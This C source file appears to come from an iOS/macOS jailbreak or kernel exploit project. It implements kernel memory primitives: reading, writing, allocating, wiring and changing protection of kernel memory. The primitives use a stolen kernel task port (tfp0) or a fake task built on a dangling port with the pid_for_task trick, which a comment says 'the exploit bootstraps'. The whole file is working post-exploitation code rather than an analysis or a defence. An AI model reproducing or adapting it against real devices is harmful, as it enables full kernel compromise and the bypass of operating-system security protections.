#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "KMem.h"
#include "KUtils.h"
// the exploit bootstraps the full kernel memory read/write with a fake
// task which just allows reading via the bsd_info->pid trick
// this first port is kmem_read_port
mach_port_t kmem_read_port = MACH_PORT_NULL;
void prepare_rk_via_kmem_read_port(mach_port_t port)
{
    kmem_read_port = port;
}

void prepare_rwk_via_tfp0(mach_port_t port)
{
    tfp0 = port;
}

void set_tfp0_rw(mach_port_t fake_tfp0)
{
    tfp0 = fake_tfp0;
}

bool have_kmem_read()
{
    return (kmem_read_port != MACH_PORT_NULL) || (tfp0 != MACH_PORT_NULL);
}

bool have_kmem_write()
{
    return (tfp0 != MACH_PORT_NULL);
}

size_t kreadOwO(uint64_t where, void* p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfp0,
                                    where + offset,
                                    chunk,
                                    (mach_vm_address_t)p + offset,
                                    &sz);
        if (rv || sz == 0) {
            fprintf(stderr, "error reading kernel @%p", (void*)(offset + where));
            break;
        }
        offset += sz;
    }
    return offset;
}



int kstrcmp(uint64_t kstr, const char* str) {
    // XXX be safer, dont just assume you wont cause any
    // page faults by this
    size_t len = strlen(str) + 1;
    char *local = malloc(len + 1);
    local[len] = '\0';
    
    int ret = 1;
    
    if (kreadOwO(kstr, local, len) == len) {
        ret = strcmp(local, str);
    }
    
    free(local);
    
    return ret;
}

size_t kwriteOwO(uint64_t where, const void* p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfp0,
                           where + offset,
                           (mach_vm_offset_t)p + offset,
                           (mach_msg_type_number_t)chunk);
        if (rv) {
            fprintf(stderr, "error writing kernel @%p", (void*)(offset + where));
            break;
        }
        offset += chunk;
    }
    return offset;
}

bool wkbuffer(uint64_t kaddr, void* buffer, size_t length)
{
    if (tfp0 == MACH_PORT_NULL) {
        fprintf(stderr, "attempt to write to kernel memory before any kernel memory write primitives available");
        return false;
    }
    
    return (kwriteOwO(kaddr, buffer, length) == length);
}

bool rkbuffer(uint64_t kaddr, void* buffer, size_t length)
{
    return (kreadOwO(kaddr, buffer, length) == length);
}

void WriteKernel32(uint64_t kaddr, uint32_t val)
{
    if (tfp0 == MACH_PORT_NULL) {
        fprintf(stderr, "attempt to write to kernel memory before any kernel memory write primitives available");
        return;
    }
    wkbuffer(kaddr, &val, sizeof(val));
}

void WriteKernel64(uint64_t kaddr, uint64_t val)
{
    if (tfp0 == MACH_PORT_NULL) {
        fprintf(stderr, "attempt to write to kernel memory before any kernel memory write primitives available");
        return;
    }
    wkbuffer(kaddr, &val, sizeof(val));
}

uint32_t rk32_via_kmem_read_port(uint64_t kaddr)
{
    kern_return_t err;
    if (kmem_read_port == MACH_PORT_NULL) {
        fprintf(stderr, "kmem_read_port not set, have you called prepare_rk?");
        exit(EXIT_FAILURE);
    }
    
    mach_port_context_t context = (mach_port_context_t)kaddr - 0x10;
    err = mach_port_set_context(mach_task_self(), kmem_read_port, context);
    if (err != KERN_SUCCESS) {
        fprintf(stderr, "error setting context off of dangling port: %x %s", err, mach_error_string(err));
        exit(EXIT_FAILURE);
    }
    
    // now do the read:
    uint32_t val = 0;
    err = pid_for_task(kmem_read_port, (int*)&val);
    if (err != KERN_SUCCESS) {
        fprintf(stderr, "error calling pid_for_task %x %s", err, mach_error_string(err));
        exit(EXIT_FAILURE);
    }
    
    return val;
}

uint32_t rk32_via_tfp0(uint64_t kaddr)
{
    uint32_t val = 0;
    rkbuffer(kaddr, &val, sizeof(val));
    return val;
}

uint64_t rk64_via_kmem_read_port(uint64_t kaddr)
{
    uint64_t lower = rk32_via_kmem_read_port(kaddr);
    uint64_t higher = rk32_via_kmem_read_port(kaddr + 4);
    uint64_t full = ((higher << 32) | lower);
    return full;
}

uint64_t rk64_via_tfp0(uint64_t kaddr)
{
    uint64_t val = 0;
    rkbuffer(kaddr, &val, sizeof(val));
    return val;
}

uint32_t ReadKernel32(uint64_t kaddr)
{
    if (tfp0 != MACH_PORT_NULL) {
        return rk32_via_tfp0(kaddr);
    }
    
    if (kmem_read_port != MACH_PORT_NULL) {
        return rk32_via_kmem_read_port(kaddr);
    }
    
    fprintf(stderr, "attempt to read kernel memory but no kernel memory read primitives available");
    
    return 0;
}

uint64_t ReadKernel64(uint64_t kaddr)
{
    if (tfp0 != MACH_PORT_NULL) {
        return rk64_via_tfp0(kaddr);
    }
    
    if (kmem_read_port != MACH_PORT_NULL) {
        return rk64_via_kmem_read_port(kaddr);
    }
    
    fprintf(stderr, "attempt to read kernel memory but no kernel memory read primitives available");
    
    return 0;
}

const uint64_t kernel_address_space_base = 0xffff000000000000;
void kmemcpy(uint64_t dest, uint64_t src, uint32_t length)
{
    if (dest >= kernel_address_space_base) {
        // copy to kernel:
        wkbuffer(dest, (void*)src, length);
    } else {
        // copy from kernel
        rkbuffer(src, (void*)dest, length);
    }
}

uint64_t kmem_alloc(uint64_t size)
{
    if (tfp0 == MACH_PORT_NULL) {
        fprintf(stderr, "attempt to allocate kernel memory before any kernel memory write primitives available");
        return 0;
    }
    
    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    err = mach_vm_allocate(tfp0, &addr, ksize, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        fprintf(stderr, "unable to allocate kernel memory via tfp0: %s %x", mach_error_string(err), err);
        return 0;
    }
    return addr;
}

uint64_t kmem_alloc_wired(uint64_t size)
{
    if (tfp0 == MACH_PORT_NULL) {
        fprintf(stderr, "attempt to allocate kernel memory before any kernel memory write primitives available");
        return 0;
    }
    
    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    
   fprintf(stderr, "vm_kernel_page_size: %lx", vm_kernel_page_size);
    
    err = mach_vm_allocate(tfp0, &addr, ksize + 0x4000, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        fprintf(stderr, "unable to allocate kernel memory via tfp0: %s %x", mach_error_string(err), err);
        return 0;
    }
    
    fprintf(stderr, "allocated address: %llx", addr);
    
    addr += 0x3fff;
    addr &= ~0x3fffull;
    
    fprintf(stderr, "address to wire: %llx", addr);
    
    err = mach_vm_wire(fake_host_priv(), tfp0, addr, ksize, VM_PROT_READ | VM_PROT_WRITE);
    if (err != KERN_SUCCESS) {
        fprintf(stderr, "unable to wire kernel memory via tfp0: %s %x", mach_error_string(err), err);
        return 0;
    }
    return addr;
}

bool kmem_free(uint64_t kaddr, uint64_t size)
{
    if (tfp0 == MACH_PORT_NULL) {
        fprintf(stderr, "attempt to deallocate kernel memory before any kernel memory write primitives available");
        return false;
    }
    
    kern_return_t err;
    mach_vm_size_t ksize = round_page_kernel(size);
    err = mach_vm_deallocate(tfp0, kaddr, ksize);
    if (err != KERN_SUCCESS) {
        fprintf(stderr, "unable to deallocate kernel memory via tfp0: %s %x", mach_error_string(err), err);
        return false;
    }
    return true;
}

bool kmem_protect(uint64_t kaddr, uint32_t size, int prot)
{
    if (tfp0 == MACH_PORT_NULL) {
        fprintf(stderr, "attempt to change protection of kernel memory before any kernel memory write primitives available");
        return false;
    }
    kern_return_t err;
    err = mach_vm_protect(tfp0, (mach_vm_address_t)kaddr, (mach_vm_size_t)size, 0, (vm_prot_t)prot);
    if (err != KERN_SUCCESS) {
        fprintf(stderr, "unable to change protection of kernel memory via tfp0: %s %x", mach_error_string(err), err);
        return false;
    }
    return true;
}
